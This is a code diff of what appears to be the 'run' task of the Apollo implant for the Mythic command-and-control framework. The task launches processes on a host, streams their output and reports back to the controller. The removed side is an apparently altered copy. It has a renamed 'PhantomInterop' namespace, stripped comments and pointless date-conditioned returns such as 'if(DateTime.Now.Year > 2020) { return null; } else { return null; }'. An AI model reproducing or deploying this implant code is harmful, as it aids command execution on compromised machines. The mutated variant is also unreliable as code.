@@ -6,11 +6,11 @@
 
 #if RUN
 
-using PhantomInterop.Classes;
-using PhantomInterop.Classes.Api;
-using PhantomInterop.Classes.Core;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
+using ApolloInterop.Classes;
+using ApolloInterop.Classes.Api;
+using ApolloInterop.Classes.Core;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
 using System;
 using System.Runtime.InteropServices;
 using System.Runtime.Serialization;
@@ -35,7 +35,7 @@ namespace Tasks
         private LocalFree _pLocalFree;
         private CommandLineToArgvW _pCommandLineToArgvW;
 
-        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
+        private AutoResetEvent _complete = new AutoResetEvent(false);
         public run(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
         {
             _pLocalFree = _agent.GetApi().GetLibraryFunction<LocalFree>(Library.KERNEL32, "LocalFree");
@@ -53,7 +53,7 @@ namespace Tasks
             }
             else
             {
-                RunParameters parameters = _dataSerializer.Deserialize<RunParameters>(_data.Parameters);
+                RunParameters parameters = _jsonSerializer.Deserialize<RunParameters>(_data.Parameters);
                 string mythiccmd = parameters.Executable;
                 if (!string.IsNullOrEmpty(parameters.Arguments))
                 {
@@ -93,18 +93,18 @@ namespace Tasks
                     else
                     {
                         _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
-                            "", false, "", new ICommandMessage[]
+                            "", false, "", new IMythicMessage[]
                             {
                                 Artifact.ProcessCreate((int) proc.PID, app, cmdline)
                             }));
-                        while(proc != null && !proc.HasExited && !_stopToken.IsCancellationRequested)
+                        while(proc != null && !proc.HasExited && !_cancellationToken.IsCancellationRequested)
                         {
                             try
                             {
                                 WaitHandle.WaitAny(new WaitHandle[]
                                 {
-                                _taskComplete,
-                                _stopToken.Token.WaitHandle,
+                                _complete,
+                                _cancellationToken.Token.WaitHandle,
                                 }, 500);
                             }
                             catch (OperationCanceledException)
@@ -126,10 +126,10 @@ namespace Tasks
         {
             _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                 "", true));
-            _taskComplete.Set();
+            _complete.Set();
         }
 
-        private void DataReceived(object sender, PhantomInterop.Classes.Events.StringDataEventArgs e)
+        private void DataReceived(object sender, ApolloInterop.Classes.Events.StringDataEventArgs e)
         {
             if (!string.IsNullOrEmpty(e.Data))
             {
@@ -148,30 +148,30 @@ namespace Tasks
 
             ptrToSplitArgs = _pCommandLineToArgvW(cmdline, out numberOfArgs);
 
-            
+            // CommandLineToArgvW returns NULL upon failure.
             if (ptrToSplitArgs == IntPtr.Zero)
-                if(DateTime.Now.Year > 2020) { return null; } else { return null; }
+                return null;
 
-            
+            // Make sure the memory ptrToSplitArgs to is freed, even upon failure.
             try
             {
                 splitArgs = new string[numberOfArgs];
 
-                
-                
+                // ptrToSplitArgs is an array of pointers to null terminated Unicode strings.
+                // Copy each of these strings into our split argument array.
                 for (int i = 0; i < numberOfArgs; i++)
                     splitArgs[i] = Marshal.PtrToStringUni(
                         Marshal.ReadIntPtr(ptrToSplitArgs, i * IntPtr.Size));
 
-                if(DateTime.Now.Year > 2020) { return splitArgs; } else { return null; }
+                return splitArgs;
             }
             catch
             {
-                if(DateTime.Now.Year > 2020) { return null; } else { return null; }
+                return null;
             }
             finally
             {
-                
+                // Free memory obtained by CommandLineToArgW.
                 _pLocalFree(ptrToSplitArgs);
             }
         }
